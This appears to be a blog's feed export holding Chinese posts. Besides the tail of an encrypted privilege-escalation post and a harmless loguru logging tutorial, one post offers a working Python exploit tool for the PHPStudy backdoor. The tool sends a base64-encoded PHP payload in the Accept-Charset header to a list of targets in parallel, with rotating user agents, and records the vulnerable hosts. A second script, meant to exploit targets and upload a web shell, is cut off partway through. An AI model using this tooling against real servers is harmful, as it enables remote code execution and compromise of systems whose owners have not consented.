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
</div>
<script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>权限提升</category>
      </categories>
      <tags>
        <tag>提权</tag>
        <tag>渗透</tag>
      </tags>
  </entry>
  <entry>
    <title>Python 中更优雅的日志记录方案——loguru</title>
    <url>/2019/10/14/Python-%E4%B8%AD%E6%9B%B4%E4%BC%98%E9%9B%85%E7%9A%84%E6%97%A5%E5%BF%97%E8%AE%B0%E5%BD%95%E6%96%B9%E6%A1%88%E2%80%94%E2%80%94loguru/</url>
    <content><![CDATA[<h3 id="python日志记录方案"><a href="#python日志记录方案" class="headerlink" title="python日志记录方案"></a>python日志记录方案</h3><blockquote>
<p>在 Python 中，一般情况下我们可能直接用自带的 logging 模块来记录日志，包括我之前的时候也是一样。在使用时我们需要配置一些 Handler、Formatter 来进行一些处理，比如把日志输出到不同的位置，或者设置一个不同的输出格式，或者设置日志分块和备份。但其实个人感觉 logging 用起来其实并不是那么好用，其实主要还是配置较为繁琐。</p>
</blockquote>
<h3 id="更优雅的方式"><a href="#更优雅的方式" class="headerlink" title="更优雅的方式"></a>更优雅的方式</h3><p><strong>loguru</strong></p>
<blockquote>
<p>loguru不需要配置什么东西，直接引入一个 logger，然后调用其 debug 方法即可。在 loguru 里面有且仅有一个主要对象，那就是 logger，loguru 里面有且仅有一个 logger，而且它已经被提前配置了一些基础信息，比如比较友好的格式化、文本颜色信息等等。</p>
</blockquote>
<h4 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h4><p><code>pip3 install loguru</code></p>
<h4 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h4><h5 id="输出日志"><a href="#输出日志" class="headerlink" title="输出日志"></a>输出日志</h5><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> loguru <span class="keyword">import</span> logger</span><br><span class="line">logger.debug(<span class="string">"这是一条debug日志"</span>)</span><br></pre></td></tr></table></figure>
<h5 id="输出到文件"><a href="#输出到文件" class="headerlink" title="输出到文件"></a>输出到文件</h5><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> loguru <span class="keyword">import</span> logger</span><br><span class="line"></span><br><span class="line">logger.add(<span class="string">"file_&#123;time&#125;.log"</span>)</span><br><span class="line"></span><br><span class="line">logger.debug(<span class="string">"这是一条debug日志"</span>)</span><br><span class="line">logger.info(<span class="string">"这是一条info日志"</span>)</span><br></pre></td></tr></table></figure>
<h5 id="日志规则"><a href="#日志规则" class="headerlink" title="日志规则"></a>日志规则</h5><p>设置日志格式，过滤器，日志级别</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> loguru <span class="keyword">import</span> logger</span><br><span class="line"></span><br><span class="line">logger.add(<span class="string">"file.log"</span>, format=<span class="string">"&#123;time&#125; &#123;level&#125; &#123;message&#125;"</span>, filter=<span class="string">""</span>, level=<span class="string">"INFO"</span>)</span><br><span class="line"></span><br><span class="line">logger.debug(<span class="string">"这是一条debug日志"</span>)</span><br><span class="line">logger.info(<span class="string">"这是一条info日志"</span>)</span><br></pre></td></tr></table></figure>
<h5 id="日志文件"><a href="#日志文件" class="headerlink" title="日志文件"></a>日志文件</h5><p>文件管理方式</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">logger.add(<span class="string">"file_1.log"</span>, rotation=<span class="string">"500 MB"</span>)    <span class="comment"># 文件过大就会重新生成一个文件</span></span><br><span class="line">logger.add(<span class="string">"file_2.log"</span>, rotation=<span class="string">"12:00"</span>)     <span class="comment"># 每天12点创建新文件</span></span><br><span class="line">logger.add(<span class="string">"file_3.log"</span>, rotation=<span class="string">"1 week"</span>)    <span class="comment"># 文件时间过长就会创建新文件</span></span><br><span class="line"></span><br><span class="line">logger.add(<span class="string">"file_X.log"</span>, retention=<span class="string">"10 days"</span>)  <span class="comment"># 一段时间后会清空</span></span><br><span class="line"></span><br><span class="line">logger.add(<span class="string">"file_Y.log"</span>, compression=<span class="string">"zip"</span>)    <span class="comment"># 保存zip格式</span></span><br></pre></td></tr></table></figure>
<h5 id="其他参数"><a href="#其他参数" class="headerlink" title="其他参数"></a>其他参数</h5><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">logger.add(<span class="string">"somefile.log"</span>, enqueue=<span class="keyword">True</span>)  <span class="comment"># 异步写入</span></span><br><span class="line"></span><br><span class="line">logger.add(<span class="string">"somefile.log"</span>, serialize=<span class="keyword">True</span>)  <span class="comment"># 序列化为json</span></span><br></pre></td></tr></table></figure>
<h5 id="时间格式化"><a href="#时间格式化" class="headerlink" title="时间格式化"></a>时间格式化</h5><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">logger.add(<span class="string">"file.log"</span>, format=<span class="string">"&#123;time:YYYY-MM-DD at HH:mm:ss&#125; | &#123;level&#125; | &#123;message&#125;"</span>)</span><br></pre></td></tr></table></figure>
<p>配合notifiers模块<br>github： <a href="https://github.com/notifiers/notifiers" target="_blank" rel="noopener">https://github.com/notifiers/notifiers</a><br>文档：<a href="https://notifiers.readthedocs.io/en/latest/" target="_blank" rel="noopener">https://notifiers.readthedocs.io/en/latest/</a></p>
<h5 id="在工程中创建多个文件处理器对象并解决中文乱码问题"><a href="#在工程中创建多个文件处理器对象并解决中文乱码问题" class="headerlink" title="在工程中创建多个文件处理器对象并解决中文乱码问题"></a>在工程中创建多个文件处理器对象并解决中文乱码问题</h5><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> loguru <span class="keyword">import</span> logger</span><br><span class="line"></span><br><span class="line">BASE_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))</span><br><span class="line"></span><br><span class="line">log_file_path = os.path.join(BASE_DIR,<span class="string">'Log/my_first.log'</span>)</span><br><span class="line">err_log_file_path = os.path.join(BASE_DIR,<span class="string">'Log/error.log'</span>)</span><br><span class="line"></span><br><span class="line">logger.add(sys.stderr, format=<span class="string">"&#123;time&#125; &#123;level&#125; &#123;message&#125;"</span>, filter=<span class="string">"my_noudle"</span>, level=<span class="string">"INFO"</span>)</span><br><span class="line"></span><br><span class="line">logger.add(log_file_path, rotation=<span class="string">"500 MB"</span>, encoding=<span class="string">'utf-8'</span>)  <span class="comment"># Automatically rotate too big file</span></span><br><span class="line">logger.add(err_log_file_path, rotation=<span class="string">"500 MB"</span>, encoding=<span class="string">'utf-8'</span>,</span><br><span class="line">           level=<span class="string">'ERROR'</span>)  <span class="comment"># Automatically rotate too big file</span></span><br><span class="line">logger.debug(<span class="string">"That's it, beautiful and simple logging!"</span>)</span><br><span class="line">logger.debug(<span class="string">"中文日志可以不"</span>)</span><br><span class="line">logger.error(<span class="string">"严重错误"</span>)</span><br></pre></td></tr></table></figure>
<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1571020366.4.png" alt></p>
<h5 id="Traceback-记录"><a href="#Traceback-记录" class="headerlink" title="Traceback 记录"></a>Traceback 记录</h5><blockquote>
<p>在很多情况下，如果遇到运行错误，而我们在打印输出 log 的时候万一不小心没有配置好 Traceback 的输出，很有可能我们就没法追踪错误所在了。但用了 loguru 之后，我们用它提供的装饰器就可以直接进行 Traceback 的记录。<strong>用 loguru 可以非常方便地实现日志追踪</strong></p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> loguru <span class="keyword">import</span> logger</span><br><span class="line"></span><br><span class="line"><span class="meta">@logger.catch</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">my_function</span><span class="params">(x, y, z)</span>:</span></span><br><span class="line">    <span class="comment"># An error? It's caught anyway!</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span> / (x + y + z)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">my_function(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)</span><br></pre></td></tr></table></figure>
<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1571020539.21.png" alt></p>
<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://mp.weixin.qq.com/s?__biz=MzIzNzA4NDk3Nw==&amp;mid=2457738232&amp;idx=1&amp;sn=bfc6437b494249270d2b6dc3469eda61&amp;chksm=ff44b3a6c8333ab010268aed413da647f711839dbf8ba8b73d06b9502a4ba95482b11606f81b&amp;mpshare=1&amp;scene=23&amp;srcid=&amp;sharer_sharetime=1571014978932&amp;sharer_shareid=b4f68ebe4eb5286506b3d3b1a76fd4c7#rd" target="_blank" rel="noopener">Python 中更优雅的日志记录方案</a></p>
<p><a href="https://loguru.readthedocs.io/en/stable/index.html" target="_blank" rel="noopener">loguru官方文档</a></p>
<p><a href="http://www.manongjc.com/detail/8-xkpixvxrrbkbqxw.html" target="_blank" rel="noopener">Python 第三方日志框架loguru使用</a></p>
]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>编程</tag>
        <tag>loguru</tag>
      </tags>
  </entry>
  <entry>
    <title>PHPstudy后门漏洞POC-EXP编写</title>
    <url>/2019/10/14/PHPstudy%E5%90%8E%E9%97%A8%E6%BC%8F%E6%B4%9EPOC-EXP%E7%BC%96%E5%86%99/</url>
    <content><![CDATA[<h3 id="PHPstudy后门漏洞POC-EXP编写"><a href="#PHPstudy后门漏洞POC-EXP编写" class="headerlink" title="PHPstudy后门漏洞POC-EXP编写"></a>PHPstudy后门漏洞POC-EXP编写</h3><blockquote>
<p>phpstudy后门事件过去有一段时间了，漏洞也已经复现了；网上有好多检测的POC，为什么要自己写呢，因为好久没有写代码了，通过这个漏洞巩固一下code，代码国庆前写了一半，被各种事情耽搁，今天补写完整。这次写代码使用面向对象以及参数化编写，就漏洞本身来说，这种方式很麻烦，但是为了毕设的代码量练习（小声BB）。脚本支持PHPstudy2018和2016后门漏洞的检测、利用以及直接上传shell。</p>
</blockquote>
<h3 id="代码-and-效果"><a href="#代码-and-效果" class="headerlink" title="代码 and 效果"></a>代码 and 效果</h3><h4 id="批量检测POC"><a href="#批量检测POC" class="headerlink" title="批量检测POC"></a>批量检测POC</h4><p>支持自定义输入目标文件</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">@Description: </span></span><br><span class="line"><span class="string">@Author: demos</span></span><br><span class="line"><span class="string">@Github: https://github.com/demossl</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> threadpool</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> urllib3</span><br><span class="line">urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)</span><br><span class="line"></span><br><span class="line">USER_AGENTS = [</span><br><span class="line">    <span class="string">"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; AcooBrowser; .NET CLR 1.1.4322; .NET CLR 2.0.50727)"</span>,</span><br><span class="line">    <span class="string">"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; Acoo Browser; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0; .NET CLR 3.0.04506)"</span>,</span><br><span class="line">    <span class="string">"Mozilla/4.0 (compatible; MSIE 7.0; AOL 9.5; AOLBuild 4337.35; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727)"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (Windows; U; MSIE 9.0; Windows NT 9.0; en-US)"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET CLR 2.0.50727; Media Center PC 6.0)"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET CLR 1.0.3705; .NET CLR 1.1.4322)"</span>,</span><br><span class="line">    <span class="string">"Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.2; .NET CLR 1.1.4322; .NET CLR 2.0.50727; InfoPath.2; .NET CLR 3.0.04506.30)"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN) AppleWebKit/523.15 (KHTML, like Gecko, Safari/419.3) Arora/0.3 (Change: 287 c9dfb30)"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (X11; U; Linux; en-US) AppleWebKit/527+ (KHTML, like Gecko, Safari/419.3) Arora/0.6"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.2pre) Gecko/20070215 K-Ninja/2.1.1"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.9) Gecko/20080705 Firefox/3.0 Kapiko/3.0"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (X11; Linux i686; U;) Gecko/20070322 Kazehakase/0.4.5"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko Fedora/1.9.0.8-1.fc10 Kazehakase/0.5.6"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.56 Safari/535.11"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_3) AppleWebKit/535.20 (KHTML, like Gecko) Chrome/19.0.1036.7 Safari/535.20"</span>,</span><br><span class="line">    <span class="string">"Opera/9.80 (Macintosh; Intel Mac OS X 10.6.8; U; fr) Presto/2.9.168 Version/11.52"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.11 TaoBrowser/2.0 Safari/536.11"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.71 Safari/537.1 LBBROWSER"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; LBBROWSER)"</span>,</span><br><span class="line">    <span class="string">"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; QQDownload 732; .NET4.0C; .NET4.0E; LBBROWSER)"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.84 Safari/535.11 LBBROWSER"</span>,</span><br><span class="line">    <span class="string">"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; QQBrowser/7.0.3698.400)"</span>,</span><br><span class="line">    <span class="string">"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; QQDownload 732; .NET4.0C; .NET4.0E)"</span>,</span><br><span class="line">    <span class="string">"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; SV1; QQDownload 732; .NET4.0C; .NET4.0E; 360SE)"</span>,</span><br><span class="line">    <span class="string">"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; QQDownload 732; .NET4.0C; .NET4.0E)"</span>,</span><br><span class="line">    <span class="string">"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.89 Safari/537.1"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.89 Safari/537.1"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (iPad; U; CPU OS 4_2_1 like Mac OS X; zh-cn) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8C148 Safari/6533.18.5"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:2.0b13pre) Gecko/20110307 Firefox/4.0b13pre"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:16.0) Gecko/20100101 Firefox/16.0"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (X11; U; Linux x86_64; zh-CN; rv:1.9.2.10) Gecko/20100922 Ubuntu/10.10 (maverick) Firefox/3.6.10"</span></span><br><span class="line">]</span><br><span class="line">TIME_OUT=<span class="number">15</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check</span><span class="params">(url)</span>:</span></span><br><span class="line">    payload = <span class="string">"phpinfo();"</span></span><br><span class="line">    payload = base64.b64encode(payload.encode(<span class="string">'utf-8'</span>))</span><br><span class="line">    headers = &#123;&#125;</span><br><span class="line">    headers[<span class="string">'User-Agent'</span>] = random.choice(USER_AGENTS)</span><br><span class="line">    headers[<span class="string">'Accept-Encoding'</span>] = <span class="string">'gzip,deflate'</span></span><br><span class="line">    headers[<span class="string">'Accept-Charset'</span>] = payload</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        result = requests.get(url,headers=headers,timeout=TIME_OUT)</span><br><span class="line">        result.encoding = <span class="string">'gbk'</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">"phpinfo"</span> <span class="keyword">in</span> str(result.content):</span><br><span class="line">            print(<span class="string">'[+] Target is vulnerable.'</span>)</span><br><span class="line">            <span class="keyword">with</span> open(<span class="string">'success.txt'</span>,<span class="string">'a'</span>) <span class="keyword">as</span> f:</span><br><span class="line">                f.write(url + <span class="string">'\n'</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">True</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">'[-] Target is NOT vulnerable.'</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        print(<span class="string">'[-] some error!'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    files = input(<span class="string">'please input the files:\n'</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">with</span> open(files,<span class="string">'r'</span>) <span class="keyword">as</span> f:</span><br><span class="line">            lines = f.read().splitlines()</span><br><span class="line">            print(lines)</span><br><span class="line">            task_pool = threadpool.ThreadPool(<span class="number">10</span>)</span><br><span class="line">            requests = threadpool.makeRequests(check,lines)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> req <span class="keyword">in</span> requests:</span><br><span class="line">            task_pool.putRequest(req)</span><br><span class="line">            task_pool.wait()</span><br><span class="line">    <span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">        sys.exit()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1570982761.17.png" alt><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1570982822.79.png" alt></p>
<h4 id="带参数检测、利用、传shell"><a href="#带参数检测、利用、传shell" class="headerlink" title="带参数检测、利用、传shell"></a>带参数检测、利用、传shell</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">@Description: </span></span><br><span class="line"><span class="string">@Author: demos</span></span><br><span class="line"><span class="string">@Github: https://github.com/demossl</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> urllib3</span><br><span class="line">urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)</span><br><span class="line"></span><br><span class="line">USER_AGENTS = [</span><br><span class="line">    <span class="string">"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; AcooBrowser; .NET CLR 1.1.4322; .NET CLR 2.0.50727)"</span>,</span><br><span class="line">    <span class="string">"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; Acoo Browser; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0; .NET CLR 3.0.04506)"</span>,</span><br><span class="line">    <span class="string">"Mozilla/4.0 (compatible; MSIE 7.0; AOL 9.5; AOLBuild 4337.35; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727)"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (Windows; U; MSIE 9.0; Windows NT 9.0; en-US)"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET CLR 2.0.50727; Media Center PC 6.0)"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET CLR 1.0.3705; .NET CLR 1.1.4322)"</span>,</span><br><span class="line">    <span class="string">"Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.2; .NET CLR 1.1.4322; .NET CLR 2.0.50727; InfoPath.2; .NET CLR 3.0.04506.30)"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN) AppleWebKit/523.15 (KHTML, like Gecko, Safari/419.3) Arora/0.3 (Change: 287 c9dfb30)"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (X11; U; Linux; en-US) AppleWebKit/527+ (KHTML, like Gecko, Safari/419.3) Arora/0.6"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.2pre) Gecko/20070215 K-Ninja/2.1.1"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.9) 